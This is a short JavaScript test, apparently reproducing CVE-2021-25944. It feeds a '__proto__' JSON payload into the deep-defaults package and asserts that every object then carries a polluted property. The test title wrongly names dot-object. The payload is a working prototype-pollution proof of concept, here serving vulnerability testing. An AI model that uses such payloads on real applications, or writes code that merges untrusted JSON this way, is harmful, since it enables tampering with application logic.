//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944
test("prototype pollution in dot-object ", () => {
  var deepDefaults = require("deep-defaults");
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  var obj = {};

  expect({}.polluted).toBe(undefined);

  deepDefaults(obj, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
